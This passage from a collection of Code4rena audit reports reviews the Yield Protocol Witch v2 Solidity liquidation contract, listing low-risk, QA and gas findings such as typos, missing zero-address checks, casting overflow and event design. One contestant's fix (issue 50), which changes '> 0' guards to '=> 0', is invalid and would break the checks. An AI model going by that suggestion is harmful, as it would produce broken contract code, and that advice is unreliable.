narrow focus in this audit on a single contract.  Here are a few more recommendations: - I find Maker terminology like `ilk`, `ink`, and `art` very useful in the domain of lending protocols, but it can be confusing to the uninitiated. It would be helpful to provide a glossary of these key terms in your project docs. Additionally, it would be helpful to note anywhere that Yield's definition of some concept diverges from Maker's. For example, a Yield `ilk` is a `bytes6` ID, while a Maker `ilk` is a `bytes32`. - Since this audit was limited in scope, it included a fairly narrow set of tests in `Witch.t.sol`, with external dependencies mocked or stubbed. However, at least one of my findings was related to interactions with other protocol contracts. I wrote a stubbed out test for this finding using the existing test harness, but if it was easy to write an integration/simulation test as a PoC, I would have. The hardest part of writing a test like this for an unfamiliar protocol is orchestrating all the dependencies. Consider providing a test harness that sets up all the core contracts as a tool for auditors. - Highlighting key changes between Witch V1 and Witch V2 with references to the code might have been useful, especially to motivate why you chose to make certain changes in the new design.  All in all though, your documentation is great. Thank you for investing the time and effort required to make auditing as easy as possible.  ## Low  ### Auctioneer reward can be sent to protocol contracts  I don't see a clear exploit path here, but it's possible for the caller of `auction` to send their auctioneer reward to Yield protocol contracts, for example the `Witch` itself, or the `Join` contract corresponding to the liquidated asset. The `Join` contracts appear to handle unexpected assets correctly, but consider whether there may be places in the protocol where this sort of transfer could interfere with internal accounting.  ## QA  ### Emit all auction parameters in an event  The `Auction` data type created and stored in `Witch#_calcAuction` includes the initial parameters for a given auction, and writes these values to a storage mapping:  [`Witch#_calcAuction`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L239-L248)  ```solidity             DataTypes.Auction({                 owner: vault.owner,                 start: uint32(block.timestamp), // Overflow is fine                 seriesId: vault.seriesId,                 baseId: series.baseId,                 ilkId: vault.ilkId,                 art: art,                 ink: ink,                 auctioneer: to             }); ```  However, the `Auctioned` event emitted from `Witch#_auctionStarted` includes only the vault ID and timestamp:  [`Witch#_auctionStarted`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L212-L218)  ```solidity     /// @dev Moves the vault ownership to the witch.     /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties     function _auctionStarted(bytes12 vaultId) internal virtual {         // The Witch is now in control of the vault under auction         cauldron.give(vaultId, address(this));         emit Auctioned(vaultId, uint32(block.timestamp));     } ```  It's possible to look up these parameters on chain by looking up the auction by vault ID in the `auctions` mapping, but not to access them from an event. However, since offchain indexers like the Graph primarily rely on event data, it is probably useful to emit all initial auction parameters and subsequent changes to the auction state through events. (I would also recommend including line `duration` and `initialProportion` for the auction in this event). Since an ongoing auction's current parameters are a pure function of initial conditions, remaining `art`/`ink` and time, this makes it possible to calculate the current state of any auction offchain using only event data.  This recommendation comes from personal experience: I helped develop and maintain an indexing service for Maker liquidation auctions, and having access to necessary data through events rather than having to look it up from contract storage was extremely useful for offchain monitoring tools, liquidation bots, and frontend UIs.  ### Consider a shared `Witch` registry  Witch v2 is designed to allow multiple `Witch` contracts to run in parallel. As part of this design, each `Witch` maintains its own registry of all sibling `Witch` contracts:  [`Witch#setAnotherWitch`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L138-L145)  ```solidity     /// @dev Governance function to set other liquidation contracts that may have taken vaults already.     /// @param value The address that may be set/unset as another witch     /// @param isWitch Is this address a witch or not     function setAnotherWitch(address value, bool isWitch) external auth {         otherWitches[value] = isWitch;         emit AnotherWitchSet(value, isWitch);     } ```  With this design, adding `Witch` number `n` requires `2n - 2` transactions: one tx to each of the existing contracts to register the new sibling `Witch`, plus `n - 1` to the new `Witch` to register all of its siblings. This may be expensive and error prone if there are many `Witch`es. (And it is probably perfectly fine if there are not).  Consider whether a single, shared registry of `Witch` contracts would simplify the design or save gas.  ### Use either custom errors or require statements  Both custom errors and `require` statements are used throughout the codebase. Consider adopting one or the other pattern for handling errors. This is more consistent, lowers the cognitive overhead of reading and understanding the code, and is less prone to error.  (I find it easy to accidentally reverse an error condition when switching between `require` and custom errors, since their logic is typically reversed: custom error conditions usually evaluate `true` to revert while `require` conditions should evaluate `false`).  ### Errors/improvements in comments  The comments on [`L#118-122`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L118-L122) related to `setLimit` seem out of place or outdated. The `setLimit` function only manages the \"maximum collateral\" value referenced in these comments, but not duration, proportion, minimum collateral, or decimals:  ```solidity     ///  - the auction duration to calculate liquidation prices     ///  - the proportion of the collateral that will be sold at auction start     ///  - the maximum collateral that can be auctioned at the same time     ///  - the minimum collateral that must be left when buying, unless buying all     ///  - The decimals for maximum and minimum ```  Review whether these comments are relevant to the `setLimit` function.  I found the comment on [`L#418`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L418-L421) confusing:  ```solidity         // Update concurrent collateral under auction         DataTypes.Limits memory limits_ = limits[auction_.ilkId][             auction_.baseId         ]; ```  This line loads the current limit into memory, but does not actually update it. The updates happens on [`L#430`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L430) and [`L#450`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L450).  The comment on [`L#92`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L92) might be clearer if it referred to \"Time that auctions take to offer max collateral\" rather than \"go to minimal price\":  ```solidity     /// @param duration Time that auctions take to go to minimal price ```  ### Typos  The custom error [`VaultNotLiqudable`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L27) should probably be `VaultNotLiquidatable`, or perhaps something like `VaultFullyCollateralized`.  [`Witch.sol#L520`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L520)  ```solidity -   /// @dev quoutes hoy much ink a liquidator is expected to get if it repays an `artIn` amount +   /// @dev quotes how much ink a liquidator is expected to get if it repays an `artIn` amount ```  [`Witch.sol#L385`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L385-L386)  ```solidity -    /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're differente people) +    /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're different people) ```  ## Informational  ### Google Calendar reminder may be insufficiently robust  The Yield team have set a Google Calendar reminder to replace the `Witch` contract before 7 February 2106:  [`Witch#L575`](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L575-L578)  ```solidity         // If the world has not turned to ashes and darkness, auctions will malfunction on         // the 7th of February 2106, at 06:28:16 GMT         // TODO: Replace this contract before then \ud83d\ude30         // UPDATE: Added reminder to Google calendar \u2705 ```  However, a Google Calendar reminder may be insufficient to serve as a warning to the future Yield team. In the past, Google has shut down widely used and beloved services (e.g. Reader and Inbox), and there is no guarantee that Google will exist as we know it in the year 2106. Consider taking additional steps to limit this single point of failure.  Suggestions: - Create a timeless and popular work of art that tells the story of replacing the `Witch`, like a film, novel, or folk song. - Hire a Paradigm Fellow and entrust them with the contract upgrade. They will be at most 107 years old in 2106. - Add a reminder in the \"Reminders\" app on your iPhone."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/105", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## WRONG ERROR MESSAGE STRING IN FUNCTION auction()  ```solidity= Line200: require(limits_.sum <= limits_.max, \"Collateral limit reached\"); ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L200  The above error massage would be relevent if it was only **less then** not **less then or equal**  ### Recommended Mitigation Steps Correct error message string  ```solidity= Line200: require(limits_.sum <= limits_.max, \"Collateral limit exceeded\"); ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/103", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-yield-findings", "body": "# [2022-07-fractional] QA report  ###### tags: `c4`, `2022-07-yield`, `QA`  ### no need to cast to uint128  `cauldron.debtFromBase()` will [return a uint128](https://github.com/yieldprotocol/vault-v2/blob/3d22b3d460ba031783678948cbb5f84484113990/packages/foundry/contracts/Cauldron.sol#L271-L273), so it's not necessary to cast to uint128 in this line  * https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L303-L305  ### typo comment differente -> different  * https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L385  ### typo comment quoutes -> quote * https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L520"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/102", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "Low risk, non-critical   Quality coding :  1. Line number 191, 192 can be above Line number 202,       https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L191-L192           https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L202      Because, balances  and debt  are used after this line 202 only. This could save the execution cost. Its type of gas savings too. I believe this is better       way of coding.  2.  Comment could be corrected as under-collateralized in,      https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L14  3. initialization : its better to initialize as zero in below line of code. Relying on the unknown storage data could be risky.     https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L133  4. variable name suggestion in below line of code.     https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L99-L100     proportion = VaultProportion,     initialOffer = ColletralProportion   5. code simplification:     https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L303-L309     Since artIn already knw from the line - 303, I would write the condition as below instead of using the ternary operator. Because the code could      simple and readable.    if( artIn > auction_.art )         artIn = auction_.art;  6. I would suggest the contract name as LiquidEngine.sol instead of Witch.sol    Similarly, the variable , otherWitches could be OtherLiquidEngine    Function name, setAnotherWitch could be seAnotherLiquidEngine  7. Its better to use the same datatype in all places. I see there are too many castings. it could tough to track each of the casting to verify appropriate      data type during coding. There could be possibility of missing in some places.  8. For more decentralization: It could better if the governor related cautions is displayed in front end. For example, displaying the auctioner reward in front end.         "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "**Overview** Risk Rating | Number of issues --- | --- Low Risk | 2 Non-Critical Risk | 3  **Table of Contents**  - [1. Low Risk Issues](#1-low-risk-issues)   - [1.1. Missing address(0) checks](#11-missing-address0-checks)   - [1.2. Unsafe casting may overflow](#12-unsafe-casting-may-overflow) - [2. Non-Critical Issues](#2-non-critical-issues)   - [2.1. Typos](#21-typos)   - [2.2. Open TODOS](#22-open-todos)   - [2.3. Use a `constant` instead of duplicating the same string or replace the following revert strings with Errors](#23-use-a-constant-instead-of-duplicating-the-same-string-or-replace-the-following-revert-strings-with-errors)  # 1. Low Risk Issues  ## 1.1. Missing address(0) checks  Consider adding an `address(0)` check for immutable variables:  ```diff File: Witch.sol 59:     ICauldron public immutable cauldron; ... 71:     constructor(ICauldron cauldron_, ILadle ladle_) { + 72:     require(cauldron_ != address(0)); 72:         cauldron = cauldron_; 73:         ladle = ladle_; 74:     } ```  ## 1.2. Unsafe casting may overflow  SafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting. Even if the comment says \"Overflow is fine\", consider using OpenZeppelin's SafeCast library to prevent unexpected behaviors here:  ```solidity Witch.sol:217:        emit Auctioned(vaultId, uint32(block.timestamp)); Witch.sol:241:                start: uint32(block.timestamp), // Overflow is fine Witch.sol:582:            elapsed = uint32(block.timestamp) - uint256(auction_.start); // Overflow on block.timestamp is fine ```  ```solidity File: Witch.sol 302:         // Find out how much debt is being repaid 303:         uint128 artIn = uint128( 304:             cauldron.debtFromBase(auction_.seriesId, maxBaseIn) 305:         ); ```  # 2. Non-Critical Issues  ## 2.1. Typos  - specialised  ```solidity Witch.sol:213:    /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties Witch.sol:267:    /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties Witch.sol:462:    /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties ```  - differente  ```solidity Witch.sol:385:    /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're differente people) ```  - quoutes  ```solidity Witch.sol:520:    /// @dev quoutes hoy much ink a liquidator is expected to get if it repays an `artIn` amount ```  ## 2.2. Open TODOS  Consider resolving the TODOs before deploying.  ```solidity Witch.sol:577:        // TODO: Replace this contract before then \ud83d\ude30 ```  ## 2.3. Use a `constant` instead of duplicating the same string or replace the following revert strings with Errors  ```solidity Witch.sol:255:        require(auction_.start > 0, \"Vault not under auction\"); Witch.sol:300:        require(auction_.start > 0, \"Vault not under auction\"); Witch.sol:358:        require(auction_.start > 0, \"Vault not under auction\"); Witch.sol:416:        require(auction_.start > 0, \"Vault not under auction\"); ```  ```solidity Witch.sol:365:        require(liquidatorCut >= minInkOut, \"Not enough bought\"); Witch.sol:313:        require(liquidatorCut >= minInkOut, \"Not enough bought\"); ```  ```solidity Witch.sol:328:            require(baseJoin != IJoin(address(0)), \"Join not found\"); Witch.sol:395:            require(ilkJoin != IJoin(address(0)), \"Join not found\"); ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "Gas saving:  Handling validation check Condition check could be  >=  in below line of code. This could save gas by skipping the calculation done in the else part.  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L586 When elapsed==duration, below calculation will always return 1e18 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L588-L592  memory can be used instead of storage in following lines of codes https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L254 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L231"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/86", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## [L-01] MISSING ZERO-ADDRESS CHECK Addresses should be checked against `address(0)` to prevent unintended actions, unexpected loss of assets, etc. Please consider checking the following address inputs. ``` contracts\\Witch.sol   83: function point(bytes32 param, address value) external auth {   141: function setAnotherWitch(address value, bool isWitch) external auth {   176: function auction(bytes12 vaultId, address to)   286-291:     function payBase(       bytes12 vaultId,       address to,       uint128 minInkOut,       uint128 maxBaseIn     )   344-349:     function payFYToken(       bytes12 vaultId,       address to,       uint128 minInkOut,       uint128 maxArtIn     )   528-532\uff1a     function calcPayout(       bytes12 vaultId,       address to,       uint256 maxArtIn     ) ```  ## [L-02] CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS To improve readability and maintainability, constants can be used instead of magic numbers. Please consider replacing the magic numbers in the following code with constants. ``` contracts\\Witch.sol   102: require(initialOffer <= 1e18, \"InitialOffer above 100%\");   103: require(proportion <= 1e18, \"Proportion above 100%\");   105: initialOffer == 0 || initialOffer >= 0.01e18,   108: require(proportion >= 0.01e18, \"Proportion below 1%\");   162: if (auctioneerReward_ > 1e18) {   163: revert AuctioneerRewardTooHigh(1e18, auctioneerReward_);   587: proportionNow = 1e18;   591: uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration)); ```  ## [N-01] REDUNDANT CAST `initialProportion` does not need to be converted to uint256 because it is already stored as uint256 for the following code. ``` contracts\\Witch.sol   573-591:     uint256 initialProportion = line_.initialOffer;     ...     proportionNow =       uint256(initialProportion) +       uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration)); ```  ## [N-02] REVERT REASON CAN BE MORE EXACT Because of the `initialOffer == 0` condition, `initialOffer` can be 0, which is below 1%. The revert reason can clarify that `initialOffer` can also be 0. ``` contracts\\Witch.sol   104-107:     require(       initialOffer == 0 || initialOffer >= 0.01e18,       \"InitialOffer below 1%\"     ); ```  ## [N-03] REVERT REASON CAN BE MORE DESCRIPTIVE Instead of just mentioning \"Unrecognized\", the revert reason can describe what is unrecognized. ``` contracts\\Witch.sol   83-84:     function point(bytes32 param, address value) external auth {       require(param == \"ladle\", \"Unrecognized\");  ```  ## [N-04] INCOMPLETE NATSPEC COMMENTS NatSpec provides rich documentation for code. @param and/or @return are missing for the following NatSpec comments: ``` contracts\\Witch.sol   212-214:     /// @dev Moves the vault ownership to the witch.     /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties     function _auctionStarted(bytes12 vaultId) internal virtual {     220-229:     /// @dev Calculates the auction initial values, the 2 non-trivial values are how much art must be repayed     /// and what's the max ink that will be offered in exchange. For the realtime amount of ink that's on offer     /// use `_calcPayout`     function _calcAuction(       DataTypes.Vault memory vault,       DataTypes.Series memory series,       address to,       DataTypes.Balances memory balances,       DataTypes.Debt memory debt     ) internal view returns (DataTypes.Auction memory) {     266-268:     /// @dev Moves the vault ownership back to the original owner & clean internal state.     /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties     function _auctionEnded(bytes12 vaultId, address owner) internal virtual {      385-391:     /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're differente people)     function _payInk(       DataTypes.Auction memory auction_,       address to,       uint256 liquidatorCut,       uint256 auctioneerCut     ) internal {     407-414:     /// @notice Update accounting on the Witch and on the Cauldron. Delete the auction and give back the vault if finished.     /// This function doesn't verify the vaultId matches the vault and auction passed. Check before calling.     function _updateAccounting(       bytes12 vaultId,       DataTypes.Auction memory auction_,       uint256 inkOut,       uint256 artIn     ) internal {    461-468:     /// @dev Logs that a certain amount of a vault was liquidated     /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties     function _collateralBought(       bytes12 vaultId,       address buyer,       uint256 ink,       uint256 art     ) internal virtual {     561-566:     /// @notice Return how much collateral should be given out.     function _calcPayout(       DataTypes.Auction memory auction_,       address to,       uint256 artIn     ) internal view returns (uint256 liquidatorCut, uint256 auctioneerCut) { ```  ## [N-05] @NOTICE PLACEMENT IN NATSPEC COMMENTS It is a convention to place @notice above @dev and @param in NatSpec comments, which is not the case in the following code: ``` contracts\\Witch.sol   335-343:     /// @dev Pay up to `maxArtIn` debt from a vault in liquidation using fyToken, getting at least `minInkOut` collateral.     /// @notice If too much fyToken are offered, only the necessary amount are taken.     /// @param vaultId Id of vault to buy     /// @param to Receiver for the collateral bought     /// @param maxArtIn Maximum amount of fyToken that will be paid     /// @param minInkOut Minimum amount of collateral that must be received     /// @return liquidatorCut Amount paid to `to`.     /// @return auctioneerCut Amount paid to whomever started the auction. 0 if it's the same address that's calling this method     /// @return artIn Amount of fyToken taken ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "  #### Variable name  The name `value` could be related to `_address`. `value` may confuse others with fund or numeric type.  ```     /// @dev Governance function to set other liquidation contracts that may have taken vaults already.     /// @param value The address that may be set/unset as another witch     /// @param isWitch Is this address a witch or not     function setAnotherWitch(address value, bool isWitch) external auth {         otherWitches[value] = isWitch;         emit AnotherWitchSet(value, isWitch);     } ```   #### NATSPEC not complete   ```     /// @notice Return how much collateral should be given out.     function _calcPayout(         DataTypes.Auction memory auction_,         address to,         uint256 artIn     ) internal view returns (uint256 liquidatorCut, uint256 auctioneerCut) { ```  suggestion: Follow NATSPEC.     #### MAGICAL NUMBER CAN BE DOCUMENTED AND EXPLAINED  `1e18` is used several times through the code. This may both obscure the purpose of the function and unnecessarily lead to potential error if the constants are changed during development.  ``` 102-108:         require(initialOffer <= 1e18, \"InitialOffer above 100%\");         require(proportion <= 1e18, \"Proportion above 100%\");         require(             initialOffer == 0 || initialOffer >= 0.01e18,             \"InitialOffer below 1%\"         );  162-164:         if (auctioneerReward_ > 1e18) {             revert AuctioneerRewardTooHigh(1e18, auctioneerReward_);         }  587:         proportionNow = 1e18;  591:         uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration)); ```  Suggestion: Use constants as this would make the code more maintainable and readable while costing nothing gas-wise.      #### Arithmic operation order  The division is performed first, and multiplication later.  ``` 594:        uint256 inkAtEnd = uint256(artIn).wdiv(auction_.art).wmul(auction_.ink); ```  It might be arithmically safer to do the multiplication first instead.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "# Yield-Witch-v2-code4rena Report  - [Yield-Witch-v2-code4rena Report](#yield-witch-v2-code4rena-report)   - [QA Report](#qa-report)   - [Files Description Table](#files-description-table)   - [Issues found](#issues-found)     - [[N-01]: Typos](#n-01-typos)       - [Impact](#impact)       - [Code Affected and Mitigation](#code-affected-and-mitigation)       - [Tools used](#tools-used)  ##  QA Report  ##  Files Description Table | File Name                         | SHA-1 Hash                               | | --------------------------------- | ---------------------------------------- | | 2022-07-yield/contracts/Witch.sol | 07190e9e6d7769e20bcc07030eee3802ee199a5f |  ## Issues found  ### [N-01]: Typos  #### Impact None.  #### Code Affected and Mitigation  ```diff diff --git a/contracts/Witch.sol b/contracts/Witch.sol index f98dd6a..92ca566 100644 --- a/contracts/Witch.sol +++ b/contracts/Witch.sol @@ -217,7 +217,7 @@ contract Witch is AccessControl {          emit Auctioned(vaultId, uint32(block.timestamp));      }   -    /// @dev Calculates the auction initial values, the 2 non-trivial values are how much art must be repayed +    /// @dev Calculates the auction initial values, the 2 non-trivial values are how much art must be repaid      /// and what's the max ink that will be offered in exchange. For the realtime amount of ink that's on offer      /// use `_calcPayout`      function _calcAuction( @@ -264,7 +264,7 @@ contract Witch is AccessControl {      }        /// @dev Moves the vault ownership back to the original owner & clean internal state. -    /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties +    /// Useful as a method so it can be overridden by specialised witches that may need to do extra accounting or notify 3rd parties      function _auctionEnded(bytes12 vaultId, address owner) internal virtual {          cauldron.give(vaultId, owner);          delete auctions[vaultId]; @@ -382,7 +382,7 @@ contract Witch is AccessControl {          _collateralBought(vaultId, to, liquidatorCut + auctioneerCut, artIn);      }   -    /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're differente people) +    /// @dev transfers funds from the ilkJoin to the liquidator (and potentially the auctioneer if they're different people)      function _payInk(          DataTypes.Auction memory auction_,          address to, @@ -459,7 +459,7 @@ contract Witch is AccessControl {      }        /// @dev Logs that a certain amount of a vault was liquidated -    /// Useful as a method so it can be overriden by specialised witches that may need to do extra accounting or notify 3rd parties +    /// Useful as a method so it can be overridden by specialised witches that may need to do extra accounting or notify 3rd parties      function _collateralBought(          bytes12 vaultId,          address buyer, @@ -517,7 +517,7 @@ contract Witch is AccessControl {          */ -    /// @dev quoutes hoy much ink a liquidator is expected to get if it repays an `artIn` amount +    /// @dev Quotes how much ink a liquidator is expected to get if it repays an `artIn` amount      /// Works for both Auctioned and ToBeAuctioned vaults      /// @param vaultId The vault to get a quote for      /// @param to Address that would get the collateral bought  ```  #### Tools used VS Code "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/58", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "**Missing Non-zero address check in `payBase()` can result in lost funds for liquidator**  **Proof of concept:** If a liquidator mistakenly passes the zero address as the `to` argument of the `payBase()` function, then the collateral will be sent to the zero address.   **Recommended Mitigation Steps:** Add a non-zero address check for the `to` parameter in `payBase()`      **Misleading comment in `_updateAccounting()`**  **Proof of concept:** In `_updateAccounting()` there is the following piece of code:  ```jsx // Update concurrent collateral under auction  DataTypes.Limits memory limits_ = limits[auction_.ilkId][     auction_.baseId  ]; ```  The comment says the following code will \u201cupdate\u201d something, but it is just a memory copied variable.  **Recommended Mitigation Steps:** Remove the misleading comment"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "#1 Immutable  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L60  add immutable on ladle state because  ladle state  must be initialize through constructor  #3 Code and comment not match  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L392          // If liquidatorCut is 0, then auctioneerCut is 0 too, so no need to double check         if (liquidatorCut > 0) {             IJoin ilkJoin = ladle.joins(auction_.ilkId);             require(ilkJoin != IJoin(address(0)), \"Join not found\");               // Pay auctioneer's cut if necessary             if (auctioneerCut > 0) {                 ilkJoin.exit(auction_.auctioneer, auctioneerCut.u128());             } because liquidator is 0, and then auctioneerCut is 0 too. so           if (liquidatorCut > 0) { ----->  if (liquidatorCut => 0) { and          if (auctioneerCut > 0) { -----> if (auctioneerCut => 0)  {     #3 Typo  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L520      /// @dev quoutes hoy much ink a liquidator is expected to get if it repays an `artIn` amount  change hoy to how  #4 unused natspec comment  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L567-L568  remove the natspec comment if unused. it decrase readibility  #5 Missing param comment vaultid  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L213  add natspec comment param vaultid  #6 Missing param comment  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L220  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L407  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L461  https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L562  function have natspec comment which is missing. Add natspec comments include all parameter in the function. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/48", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-yield-findings", "body": "## Summary   ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | [L&#x2011;01] | `setLine()` parameters inconsistently followed | 1 | | [L&#x2011;02] | Events will contain the wrong timestamp in the future | 1 | | [L&#x2011;03] | Integer overflow due to casting will cause contract accounting to break | 1 |  Total: 3 instances over 3 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | [N&#x2011;01] | Incomplete documentation | 1 | | [N&#x2011;02] | Timestamps in events are redundant | 1 | | [N&#x2011;03] | `constant`s should be defined rather than using magic numbers | 8 | | [N&#x2011;04] | Redundant cast | 2 | | [N&#x2011;05] | Typos | 6 | | [N&#x2011;06] | NatSpec is incomplete | 1 | | [N&#x2011;07] | Event is missing `indexed` fields | 6 | | [N&#x2011;08] | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 2 |  Total: 27 instances over 8 issues   ## Low Risk Issues  ### [L&#x2011;01]  `setLine()` parameters inconsistently followed In `setLine()` there's a [require()](https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L104-L107) that ensures that the initial offer is either equal to zero, or greater than 1%. It stands to reason that therefore, offers less than 1% are considered dust and are not actionable. If this is the case, then in the `else`-block on line 589, does not follow this same dust-skipping logic when `initialProportion` is set to zero, and will waste time offering proportions that nobody will take. This may lead to auctions taking longer than necessary, and more funds being lost. It is incorrect state handling and therefore of Low risk. If there was some other meaning behind the conditions, there should be a `require()` enforcing it  *There is 1 instance of this issue:* ```solidity File: contracts/Witch.sol  584          if (duration == type(uint32).max) {     // Interpreted as infinite duration 585              proportionNow = initialProportion; 586          } else if (elapsed > duration) { 587              proportionNow = 1e18; 588          } else { 589              proportionNow = 590                  uint256(initialProportion) + 591                  uint256(1e18 - initialProportion).wmul(elapsed.wdiv(duration)); 592:         }  ``` https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L584-L592  ### [L&#x2011;02]  Events will contain the wrong timestamp in the future While the timestamp field in the event might not affect on-chain processing, it _will_ impact off-chain tools that have to parse it. This is incorrect state handling and therefore of Low risk  *There is 1 instance of this issue:* 